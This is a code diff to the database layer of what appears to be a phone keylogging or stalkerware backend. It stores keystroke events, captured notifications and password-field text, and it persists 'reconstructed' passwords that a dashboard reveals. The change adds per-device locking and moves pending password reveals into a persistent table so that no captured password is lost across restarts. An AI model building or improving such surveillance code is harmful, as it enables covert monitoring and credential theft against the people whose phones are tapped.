@@ -142,49 +142,136 @@ export async function getAllDevices() {
 export async function deleteDeviceFromDB(deviceId) {
     if (!supabase) return;
 
-    const tables = [
-        'activity_events',
-        'captured_notifications',
-        'notifications',
-        'devices',  // Delete device row LAST (after all foreign references)
-    ];
+    return withDeviceLock(deviceId, async () => {
+        const tables = [
+            'activity_events',
+            'captured_notifications',
+            'notifications',
+            'pending_reveals',
+            'devices',  // Delete device row LAST (after all foreign references)
+        ];
 
-    for (const table of tables) {
-        try {
-            const { error } = await supabase
-                .from(table)
-                .delete()
-                .eq('device_id', deviceId);
+        for (const table of tables) {
+            try {
+                const { error } = await supabase
+                    .from(table)
+                    .delete()
+                    .eq('device_id', deviceId);
 
-            if (error) {
-                console.warn(`[Database] Error deleting from ${table} for ${deviceId}: ${error.message}`);
-            } else {
-                console.log(`[Database] âœ… Deleted ${deviceId} from ${table}`);
+                if (error) {
+                    console.warn(`[Database] Error deleting from ${table} for ${deviceId}: ${error.message}`);
+                } else {
+                    console.log(`[Database] âœ… Deleted ${deviceId} from ${table}`);
+                }
+            } catch (err) {
+                console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
             }
-        } catch (err) {
-            console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
         }
-    }
 
-    console.log(`[Database] ✅ Cascade delete complete for device ${deviceId}`);
+        console.log(`[Database] ✅ Cascade delete complete for device ${deviceId}`);
+    });
 }
 
 // ========== ACTIVITY EVENTS ==========
 
+// ---- Per-device serialization -------------------------------------------
+// Save (phone WS batch), clear (admin) and device-delete all touch the same
+// rows. Without serialization, a clear can run while a save batch is in
+// flight, letting "cleared" rows resurrect after the DELETE commits. Every
+// mutating activity operation for one device is chained on the same promise.
+const deviceLocks = new Map();
+
+function withDeviceLock(deviceId, fn) {
+    const prev = deviceLocks.get(deviceId) || Promise.resolve();
+    const run = prev.catch(() => {}).then(fn);
+    const guarded = run.catch(() => {});
+    deviceLocks.set(deviceId, guarded);
+    guarded.finally(() => {
+        if (deviceLocks.get(deviceId) === guarded) deviceLocks.delete(deviceId);
+    });
+    return run;
+}
+
+// ---- Persistent pending reveals -----------------------------------------
 // Reveals can arrive (dashboard POST) before their event rows are persisted
 // (async WS save path) — a race that would otherwise silently drop them.
-// Held here keyed by `${deviceId}:${uuid}` and applied the moment the event
-// row is written by saveActivityEvents.
-const pendingReveals = new Map();
-const PENDING_REVEAL_MAX = 2000;
+// Holds are written to the `pending_reveals` table (not process memory) so a
+// server restart/redeploy never loses them; saveActivityEvents applies them
+// the moment the event row lands. Per-device locking (above) keeps reveal and
+// save from interleaving, so a hold is never cleared before it is applied.
+const PENDING_REVEALS_TABLE = 'pending_reveals';
+const PENDING_REVEAL_TTL_MS = 24 * 60 * 60 * 1000;
 
-function putPendingReveal(deviceId, uuid, text, partial) {
-    pendingReveals.set(`${deviceId}:${uuid}`, { text: text, partial: !!partial });
-    if (pendingReveals.size > PENDING_REVEAL_MAX) {
-        const oldest = pendingReveals.keys().next().value;
-        pendingReveals.delete(oldest);
+async function insertPendingReveals(deviceId, reveals) {
+    if (!supabase || reveals.length === 0) return;
+    try {
+        const { error } = await supabase
+            .from(PENDING_REVEALS_TABLE)
+            .upsert(reveals.map(r => ({
+                device_id: deviceId,
+                event_uuid: String(r.uuid),
+                reveal_text: r.text,
+                reveal_partial: !!r.partial,
+                created_at: new Date().toISOString(),
+            })), { onConflict: 'device_id,event_uuid' });
+        if (error) throw error;
+    } catch (err) {
+        console.warn(`[Database] Pending reveal persist failed for ${deviceId}:`, err.message);
     }
 }
+
+async function loadPendingReveals(deviceId, uuids) {
+    const found = new Map();
+    if (!supabase || !Array.isArray(uuids) || uuids.length === 0) return found;
+    try {
+        const { data, error } = await supabase
+            .from(PENDING_REVEALS_TABLE)
+            .select('event_uuid, reveal_text, reveal_partial')
+            .eq('device_id', deviceId)
+            .in('event_uuid', uuids);
+        if (error) throw error;
+        (data || []).forEach(r => {
+            found.set(r.event_uuid, { text: r.reveal_text, partial: !!r.reveal_partial });
+        });
+    } catch (err) {
+        console.warn(`[Database] Pending reveal load failed for ${deviceId}:`, err.message);
+    }
+    return found;
+}
+
+async function deletePendingReveals(deviceId, uuids) {
+    if (!supabase || !Array.isArray(uuids) || uuids.length === 0) return;
+    try {
+        const { error } = await supabase
+            .from(PENDING_REVEALS_TABLE)
+            .delete()
+            .eq('device_id', deviceId)
+            .in('event_uuid', uuids);
+        if (error) throw error;
+    } catch (err) {
+        console.warn(`[Database] Pending reveal delete failed for ${deviceId}:`, err.message);
+    }
+}
+
+function schedulePendingRevealCleanup() {
+    if (!supabase) return;
+    const cleanup = async () => {
+        try {
+            const cutoff = new Date(Date.now() - PENDING_REVEAL_TTL_MS).toISOString();
+            const { error } = await supabase
+                .from(PENDING_REVEALS_TABLE)
+                .delete()
+                .lt('created_at', cutoff);
+            if (error) console.warn('[Database] Pending reveal cleanup error:', error.message);
+        } catch (err) {
+            // Never let housekeeping take the process down.
+        }
+    };
+    cleanup();
+    setInterval(cleanup, 60 * 60 * 1000).unref();
+}
+
+schedulePendingRevealCleanup();
 
 /**
  * Save activity events to Supabase (batch upsert).
@@ -199,82 +286,97 @@ function putPendingReveal(deviceId, uuid, text, partial) {
 export async function saveActivityEvents(deviceId, events) {
     if (!supabase || !events || events.length === 0) return true;
 
-    try {
-        const rows = events.map(ev => {
-            const key = `${deviceId}:${ev.uuid || ''}`;
-            const pending = pendingReveals.get(key);
-            if (pending) pendingReveals.delete(key);
-            return {
-            device_id: deviceId,
-            event_uuid: ev.uuid || null,
-            event_type: ev.type || 'keystroke',
-            app_package: ev.app || 'unknown',
-            text: ev.text || '',
-            real_text: ev.realText || null,
-            is_password: !!ev.isPassword,
-            text_revealed: pending ? pending.text : (ev.textRevealed || null),
-            reveal_partial: pending ? pending.partial : !!ev.revealPartial,
-            full_text: ev.fullText || null,
-            class_name: ev.className || null,
-            before_text: ev.beforeText || null,
-            content_desc: ev.contentDesc || null,
-            scroll_y: typeof ev.scrollY === 'number' ? ev.scrollY : null,
-            max_scroll_y: typeof ev.maxScrollY === 'number' ? ev.maxScrollY : null,
-            item_count: typeof ev.itemCount === 'number' ? ev.itemCount : null,
-            previous_app: ev.previousApp || null,
-            created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
-        };
-        });
+    return withDeviceLock(deviceId, async () => {
+        try {
+            const uuids = events.map(e => e.uuid).filter(Boolean);
+            const pending = await loadPendingReveals(deviceId, uuids);
 
-        await withFkRetry(async () => {
-            const { error } = await supabase
-                .from('activity_events')
-                .upsert(rows, { onConflict: 'device_id,event_uuid', ignoreDuplicates: true });
-            if (error) throw error;
-        });
-        return true;
-    } catch (err) {
-        console.error('[Database] Activity save error:', err.message);
-        return false;
-    }
+            const rows = events.map(ev => {
+                const p = pending.get(ev.uuid);
+                return {
+                device_id: deviceId,
+                event_uuid: ev.uuid || null,
+                event_type: ev.type || 'keystroke',
+                app_package: ev.app || 'unknown',
+                text: ev.text || '',
+                real_text: ev.realText || null,
+                is_password: !!ev.isPassword,
+                text_revealed: p ? p.text : (ev.textRevealed || null),
+                reveal_partial: p ? p.partial : !!ev.revealPartial,
+                full_text: ev.fullText || null,
+                class_name: ev.className || null,
+                before_text: ev.beforeText || null,
+                content_desc: ev.contentDesc || null,
+                scroll_y: typeof ev.scrollY === 'number' ? ev.scrollY : null,
+                max_scroll_y: typeof ev.maxScrollY === 'number' ? ev.maxScrollY : null,
+                item_count: typeof ev.itemCount === 'number' ? ev.itemCount : null,
+                previous_app: ev.previousApp || null,
+                created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
+            };
+            });
+
+            await withFkRetry(async () => {
+                const { error } = await supabase
+                    .from('activity_events')
+                    .upsert(rows, { onConflict: 'device_id,event_uuid', ignoreDuplicates: true });
+                if (error) throw error;
+            });
+
+            // Applied — clear the persisted holds so a future re-send doesn't
+            // try to re-apply them (the upsert would ignore the row anyway).
+            if (pending.size > 0) {
+                await deletePendingReveals(deviceId, [...pending.keys()]);
+            }
+            return true;
+        } catch (err) {
+            console.error('[Database] Activity save error:', err.message);
+            return false;
+        }
+    });
 }
 
 /**
  * Persist reconstructed password text for activity events (dashboard-computed).
  * Best-effort per-row update; returns the number of rows updated. When the
  * event row has not been persisted yet (async WS save race), the reveal is
- * held in `pendingReveals` and applied by saveActivityEvents when the row
- * lands, so a reveal is never silently dropped.
+ * written to `pending_reveals` (persistent) and applied by saveActivityEvents
+ * when the row lands — a reveal is never silently dropped, even across a
+ * server restart.
  */
 export async function updateActivityReveal(deviceId, updates) {
     if (!supabase || !Array.isArray(updates) || updates.length === 0) return 0;
 
-    let updated = 0;
-    for (const u of updates) {
-        if (!u || !u.uuid || typeof u.text !== 'string' || u.text.length > 2000) continue;
-        try {
-            const { data, error } = await supabase
-                .from('activity_events')
-                .update({
-                    text_revealed: u.text,
-                    reveal_partial: !!u.partial,
-                })
-                .eq('device_id', deviceId)
-                .eq('event_uuid', u.uuid)
-                .select('id');
-            if (!error && data && data.length > 0) {
-                updated++;
-                pendingReveals.delete(`${deviceId}:${u.uuid}`);
-            } else {
-                // Row not there yet — hold until saveActivityEvents writes it.
-                putPendingReveal(deviceId, u.uuid, u.text, !!u.partial);
+    return withDeviceLock(deviceId, async () => {
+        let updated = 0;
+        const pending = [];
+        for (const u of updates) {
+            if (!u || !u.uuid || typeof u.text !== 'string' || u.text.length > 2000) continue;
+            try {
+                const { data, error } = await supabase
+                    .from('activity_events')
+                    .update({
+                        text_revealed: u.text,
+                        reveal_partial: !!u.partial,
+                    })
+                    .eq('device_id', deviceId)
+                    .eq('event_uuid', u.uuid)
+                    .select('id');
+                if (!error && data && data.length > 0) {
+                    updated++;
+                } else {
+                    // Row not there yet — hold until saveActivityEvents writes it.
+                    pending.push({ uuid: u.uuid, text: u.text, partial: !!u.partial });
+                }
+            } catch (err) {
+                console.warn(`[Database] Reveal update failed for ${deviceId}:`, err.message);
+                pending.push({ uuid: u.uuid, text: u.text, partial: !!u.partial });
             }
-        } catch (err) {
-            console.warn(`[Database] Reveal update failed for ${deviceId}:`, err.message);
-            putPendingReveal(deviceId, u.uuid, u.text, !!u.partial);
         }
-    }
-    return updated;
+        if (pending.length > 0) {
+            await insertPendingReveals(deviceId, pending);
+        }
+        return updated;
+    });
 }
 
 /**
@@ -283,18 +385,20 @@ export async function updateActivityReveal(deviceId, updates) {
 export async function deleteActivityEventsFromDB(deviceId) {
     if (!supabase) return;
 
-    try {
-        const { error } = await supabase
-            .from('activity_events')
-            .delete()
-            .eq('device_id', deviceId);
+    return withDeviceLock(deviceId, async () => {
+        try {
+            const { error } = await supabase
+                .from('activity_events')
+                .delete()
+                .eq('device_id', deviceId);
 
-        if (error) throw error;
-        console.log(`[Database] ✅ Deleted activity events for device ${deviceId}`);
-    } catch (err) {
-        console.error(`[Database] Error deleting activity events for ${deviceId}:`, err.message);
-        throw err;
-    }
+            if (error) throw error;
+            console.log(`[Database] ✅ Deleted activity events for device ${deviceId}`);
+        } catch (err) {
+            console.error(`[Database] Error deleting activity events for ${deviceId}:`, err.message);
+            throw err;
+}
+    });
 }
 
 /**
